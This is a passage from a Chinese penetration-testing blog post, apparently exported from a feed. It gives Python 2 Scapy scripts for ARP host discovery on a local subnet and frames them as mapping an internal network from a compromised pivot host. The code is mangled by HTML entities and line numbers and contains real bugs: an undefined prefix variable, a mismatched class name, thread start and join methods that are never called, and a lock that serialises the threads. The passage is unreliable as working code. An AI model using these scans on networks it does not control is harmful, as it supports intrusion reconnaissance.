logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)&gt; from scapy.all import *&gt; &gt; if len(sys.argv) != 2:&gt; print &quot;Usage - ./arp_disc.py [filename]&quot;&gt; print &quot;Example - ./arp_disc.py ip_list.txt&quot;&gt; print &quot;Example will perform an ARP scan of the local subnet to which eth0 is assigned&quot;&gt; sys.exit()&gt; &gt; filename = str(sys.argv[1])&gt; file = open(filename,&apos;r&apos;) #打开文件列表&gt; &gt; for addr in file:&gt; answer = sr1(ARP(pdst=prefix+str(addr)),timeout = 0.1,verbose = 0) #verbose=0，不显示报错的具体信息&gt; if answer == None:&gt; pass&gt; else:&gt; print addr.strip() #将报错信息打印出来&gt; 总结：二层的发现主要是在拿下一台主机以后以此机器作为跳板进而对整个内网进行发现，但是由于内网的网络环境未知，而且服务器上面不一定有nmap，所以我们要利用一切可以利用的工具：arping，nmap,netdiscover,scopy等工具，以及自己编写的脚本 针对上面的两个脚本再补充两个多线程的脚本，就当做py练手了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&gt; #!/usr/bin/python&gt; # -*- coding:utf-8 -*-&gt; import logging&gt; import subprocess&gt; import threading,time&gt;&gt; logging.getLogger("scapy.runtime").setLevel(logging.ERROR)&gt; from scapy.all import *&gt;&gt; if len(sys.argv) != 2:&gt; print "Usage - ./arp_disc.py [interface]"&gt; print "Example - ./arp_disc.py eth0"&gt; print "Example will perform an ARP scan of the local subnet to which eth0 is assigned"&gt; sys.exit()&gt;&gt; interface = str(sys.argv[1])&gt;&gt; ip = subprocess.check_output(&gt; "ifconfig " + interface + " | grep 'inet' | cut -d'.' -f 1-3 | cut -d' ' -f 10 | cut -d 'f' -f 1 ",&gt; shell = True).strip()&gt; prefix = ip.split('.')[0] + '.' + ip.split('.')[1] + '.' + ip.split('.')[2] + '.'&gt;&gt;&gt; class MyThread(threading.Thread):&gt; def __init__(self):&gt; threading.Thread.__init__(self)&gt;&gt; def run(self):&gt; global answer,lock,n&gt; time.sleep(0.1)&gt; if lock.acquire():&gt; answer = sr1(ARP(pdst = prefix + str(n)),timeout = 1,verbose = 0)&gt; if answer == None:&gt; pass&gt; else:&gt; print prefix + str(n)&gt; n += 1&gt; lock.release()&gt;&gt;&gt; if __name__ == '__main__':&gt; n = 1&gt; ThreadList = []&gt; lock = threading.Lock()&gt; for addr in range(1,254):&gt; t = MyThread()&gt; ThreadList.append(t)&gt; for t in ThreadList:&gt; t.start()&gt; for t in ThreadList:&gt; t.join()&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&gt; #!/usr/bin/python&gt; # -*- coding:utf-8 -*-&gt; import logging&gt; import subprocess&gt; import threading,time&gt;&gt; logging.getLogger("scapy.runtime").setLevel(logging.ERROR)&gt; from scapy.all import *&gt;&gt; if len(sys.argv) != 2:&gt; print "Usage - ./arp_disc.py [interface]"&gt; print "Example - ./arp_disc.py eth0"&gt; print "Example will perform an ARP scan of the local subnet to which eth0 is assigned"&gt; sys.exit()&gt;&gt; interface = str(sys.argv[1])&gt;&gt; ip = subprocess.check_output(&gt; "ifconfig " + interface + " | grep 'inet' | cut -d'.' -f 1-3 | cut -d' ' -f 10 | cut -d 'f' -f 1 ",&gt; shell = True).strip()&gt; prefix = ip.split('.')[0] + '.' + ip.split('.')[1] + '.' + ip.split('.')[2] + '.'&gt;&gt;&gt; class MyThread(threading.Thread):&gt; def __init__(self):&gt; threading.Thread.__init__(self)&gt;&gt; def run(self):&gt; global answer,lock&gt; time.sleep(0.1)&gt; if lock.acquire():&gt; for addr in range(1,254):&gt; answer = sr1(ARP(pdst = prefix + str(addr)),timeout = 1,verbose = 0)&gt; if answer == None:&gt; pass&gt; else:&gt; print prefix + str(addr)&gt; lock.release()&gt;&gt;&gt; if __name__ == '__main__':&gt; ThreadList = []&gt; lock = threading.Lock()&gt; for addr in range(1,200):&gt; t = MyThread()&gt; ThreadList.append(t)&gt; for t in ThreadList:&gt; t.start()&gt; for t in ThreadList:&gt; t.join()&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&gt; #!/usr/bin/python&gt; # -*- coding:utf-8 -*-&gt;&gt; import logging&gt; import subprocess&gt; import threading,time&gt;&gt; logging.getLogger("scapy.runtime").setLevel(logging.ERROR)&gt; from scapy.all import *&gt;&gt; if len(sys.argv) != 2:&gt; print "Usage - ./arp_disc.py [filename]"&gt; print "Example - ./arp_disc.py ip_list.txt"&gt; print "Example will perform an ARP scan of the local subnet to which eth0 is assigned"&gt; sys.exit()&gt;&gt; filename = str(sys.argv[1])&gt; file = open(filename,'r') # 打开文件列表&gt;&gt;&gt; class Mythread(threading.Thread):&gt; def __init__(self):&gt; threading.Thread.__init__(self)&gt;&gt; def run(self):&gt; global lock&gt; time.sleep(1)&gt; if lock.acquire():&gt; for addr in file:&gt; answer = sr1(ARP(pdst = addr.strip()),timeout = 0.1,&gt; verbose = 0) # verbose=0，不显示报错的具体信息,这里循环打开的是文件中的每一行IP地址&gt; if answer == None:&gt; pass&gt; else:&gt; print addr.strip() # 将报错信息打印出来&gt;&gt;&gt; if __name__ == '__main__':&gt; ThreadList = []&gt; lock = threading.Lock()&gt; for addr in range(1,200):&gt; t = MyThread()&gt; ThreadList.append(t)&gt; for t in ThreadList:&gt; t.start&gt; for t in ThreadList:&gt; t.join&gt;&gt;]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>parrot</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
</search>
